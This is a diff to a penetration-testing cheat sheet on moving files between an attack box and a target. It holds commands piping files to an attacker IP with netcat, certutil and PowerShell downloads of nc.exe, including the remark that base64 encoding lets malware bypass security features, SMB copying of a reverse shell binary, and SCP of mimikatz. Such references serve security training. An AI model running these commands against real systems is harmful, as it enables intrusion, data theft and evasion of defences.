@@ -22,10 +22,10 @@ nc -lvp 443> transfer.txt
 ````
 cat transfer.txt | nc $attackerip 443
 ````
-## Python HTTP Server File Transfer
+## Web Servers:
+### Python HTTP Server File Transfer
 - Start the Python Server in the directory where the file is located that you want to transfer
 - Use the ip address assigned to your box, if there is a vpn involved use the vpn address
-
 ```
 python3 -m http.server
 ```
@@ -50,8 +50,37 @@ chmod +x linpeas.sh
 ```
 ./linpeas.sh
 ```
-
-#### Secure Copy Protocol
+### PHP Web Server
+````
+php -S $ip:80
+````
+### Metasploit Web Server
+````
+use auxiliary/server/ftp
+auxiliary/server/tftp
+````
+## SMB File Transfer 
+- On kali box:
+````
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+````
+- On Windows (update the IP address with your Kali IP):
+````
+copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+````
+## Wget
+````
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh	Download a file using Wget
+````
+## Curl
+````
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh	Download a file using cURL
+````
+## PHP Download
+````
+php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'	
+````
+## Secure Copy Protocol
 - SCP a file from your attack box to a target box
 ```
 scp /home/kali/Documents/linpeas.sh user@10.10.10.100:/tmp
@@ -61,8 +90,17 @@ scp /home/kali/Documents/linpeas.sh user@10.10.10.100:/tmp
 ```
 scp jack@172.16.6.1:/home/kali/Documents/linpeas.sh .
 ```
-### Windows Specific File Transfer
-#### CertUtil.exe
+#### SCP More Example Usage
+- Upload a file using SCP
+````
+scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip	
+````
+- Download a file using SCP
+````
+scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe	
+````
+## Windows Specific Downloads
+### CertUtil.exe
 - Windows has a built-in command line program called CertUtil.exe which is installed as part of Certificate Services and can be used to manage certificates in Windows.
 - CertUtil is also known as living off land LOL binary which is a trusted preinstalled system tool.
 - It can even bypass security features by base64 encoding the malware.
@@ -92,7 +130,7 @@ certutil.exe -urlcache -split -f “http://[attack box ip]/nc.txt” nc.txt
 ````
 certutil.exe -decode nc.txt nc.exe
 ````
-#### Powershell downloads:System.Net.WebClient
+### Powershell downloads:System.Net.WebClient
 - First example uses .NET class System.Net.WebClient.
 - The following commands create a Powershell script on the remote Windows machine that can be used to download the file from the attack box:
 ````
@@ -121,7 +159,7 @@ Get-ExecutionPolicy
 ````
 Set-ExecutionPolicy Unrestricted
 ````
-#### Powershell Downloads: Start-BitsTransfer
+### Powershell Downloads: Start-BitsTransfer
 - Another way to download files with Powershell is by using the Background Intelligent Transfer Service (BITS).
 - The Start-BitsTransfer cmdlet creates a BITS transfer job to transfer one or more files between a client computer and a server.
 - BITS has to be enabled on the target machine in order for it to work.
@@ -129,7 +167,7 @@ Set-ExecutionPolicy Unrestricted
 ````
 powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[attack box ip]/nc.exe -Destination C:\
 ````
-#### Powershell Downloads: Invoke-WebRequest
+### Powershell Downloads: Invoke-WebRequest
 - The Invoke-WebRequest cmdlet is simple and easy to use and is available in Powershell version 3.0 and higher.
 - Downloading large files with this method may cause memory issues.  
 - Recommended to use the System.Net.Web.Client method for transferring large files.
